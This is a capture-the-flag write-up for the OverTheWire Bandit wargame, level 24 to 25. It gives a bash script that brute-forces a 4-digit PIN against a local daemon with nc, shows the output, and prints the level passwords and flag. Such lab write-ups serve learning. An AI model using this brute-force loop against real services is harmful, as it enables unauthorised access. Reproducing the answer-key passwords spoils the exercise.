#Bandit: Level 24 -> 25

##Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

##Solution
1. SSH onto the server with the username bandit24

2. Create a shell script to run the bruteforcing for you, I came up with

   ```
   #!/bin/bash
   
   pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
   
   for answer in {0..9}{0..9}{0..9}{0..9}
   do
     echo $pass' '$answer | nc 127.0.0.1 30002 >> result &
   done
   ```

3. Run the shell script for a while, in a tmp folder

4. Once it finishs we can search the results file for a correct reponse, to do this I used the unique code from level 8

   ```
   bandit24@melinda:/tmp/jm27989$ sort result | uniq -c | sort -bgr
     20722 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
     20722 Exiting.
     20721 Wrong! Please enter the correct pincode. Try again.
     1 The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
     1 Correct!
     1 
   ```

Flag: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
